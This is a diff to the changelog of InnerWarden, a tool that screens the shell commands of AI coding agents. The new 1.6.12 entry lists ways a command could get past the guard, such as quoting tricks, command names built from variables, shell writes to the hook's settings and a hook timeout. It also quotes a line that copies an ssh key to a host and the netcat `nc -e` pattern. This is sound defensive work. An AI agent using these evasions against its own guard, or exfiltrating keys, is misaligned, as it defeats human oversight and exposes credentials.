@@ -3,6 +3,76 @@
 All notable changes to InnerWarden are documented here. This project
 follows semantic versioning.
 
+## 1.6.12 - 2026-11-10
+
+A correction first. 1.6.6 said "An agent can no longer lower the guard that
+screens it". That was not true as written: the guard reads the text of one
+command, and a line could say the same thing in a way the guard read
+differently from the shell. This release closes the ways we found, refuses
+what it cannot read, and writes down what a guard that reads text does not
+see: [The guard and its own switches](docs/features.md#the-guard-and-its-own-switches).
+
+### Security
+
+- **A command that lowers the guard is read as the shell runs it.** Under an
+  enforcing hook, the guard's loosening commands were let through when the
+  line spelled them in a way the guard did not follow: a backslash inside
+  double quotes (`sh -c "sh -c innerwarden\ allow\ x"`), ANSI-C quoting
+  (`$'...'`), a comment, a here-document or a redirection between the words
+  (`innerwarden 2>/dev/null allow x`), a name built from another value on the
+  same line (`A=inner; B=${A}warden; $B monitor`), or the `-c` argument of
+  `tcsh` and the other shells the list did not hold. Each is now read as the
+  shell reads it, at a cost that grows with the length of the line and no
+  faster.
+- **A line the guard cannot read is refused when it names the guard.** Where
+  a part of such a line stays unread (a command word that is a variable
+  nothing on the line settles, a substitution that prints the command), the
+  line is refused, not guessed at, and the refusal says how to write it so
+  that it can be read. A line that does not name the guard is refused this
+  way only where its own words spell a loosening command.
+- **A write from the shell to what carries the guard is refused.** The file
+  tools were already refused a write to the agent settings that load the
+  hook, to the guard's configuration and to the guard's program. The same
+  write from the shell was not: a redirection, `tee`, `cp`, `mv`, `rm`, `ln`,
+  `install`, `sed -i`, `dd`, a download saved over the file, a `chmod` that
+  closes it to its owner. Removing, moving or locking an agent's own settings
+  folder is refused with it.
+- **Every command that lowers an InnerWarden Pro kernel guard through Pro's
+  own tools is refused**, not only the ones the list named.
+- **An ssh key used twice on a line is a read of the key.** A key given as
+  the identity (`-i`) is key use, and is let through. The excuse was given by
+  the text, so a line that named the same file as the identity and as the
+  file to copy (`scp -i KEY KEY host:`) copied the key out unrefused. The
+  excuse is now given by the place a word stands at, also behind a lock or a
+  scheduling wrapper, and a key behind a variable the line sets
+  (`F=KEY; cat $F`) is read as the key.
+- **A hook that gives no answer refuses the call.** An agent blocks a call
+  only when its hook answers with a refusal. A hook that crashed on a fault,
+  or that took longer than the agent waits, let the call run, unscreened and
+  unrecorded. The hook now answers within ten seconds and handles the fault:
+  a refusal under an enforcing hook; in monitor, a line that says the call
+  went unscreened. Not closed: a hook that is killed outright, and a fault on
+  Windows.
+
+### Fixed
+
+- **`rsync -e ssh` is no longer refused as a reverse shell.** The text
+  `rsync -e` ends in the letters of `nc -e`, netcat's exec flag, which was
+  matched anywhere in the command. It now counts only where the name starts a
+  word.
+
+### What this costs
+
+Some ordinary lines are now refused under an enforcing hook, and the refusal
+says they are the person's to run: a program run from a variable on a line
+that also names the guard (`P=innerwarden; $P --version`), an agent that
+copies a new `innerwarden` binary into place, one that writes a project's
+`.mcp.json` or `.claude/settings.json` from the shell, removes a project's
+`.claude` folder, or sets an agent's settings file to a mode that takes a bit
+from its owner (`chmod 600`). A line that costs more to read than the guard
+spends on one line, with a variable in a command left unread, is refused with
+the way to shorten it.
+
 ## 1.6.11 - 2026-10-24
 
 ### Added
@@ -143,7 +213,10 @@ follows semantic versioning.
 
 ### Security
 
-- **An agent can no longer lower the guard that screens it.** Under an
+- **The guard refuses an agent three more commands that lower it.** (This
+  entry first said "An agent can no longer lower the guard that screens it",
+  which is more than a guard that reads the text of a command can promise:
+  see 1.6.12 and [the limits](docs/features.md#where-this-ends).) Under an
   enforcing hook, `innerwarden agents connect <agent> --monitor`,
   `innerwarden agents disconnect` and `innerwarden contain` (which rewrites
   the agent's hook) were let through, while `dry-run` and `monitor` were
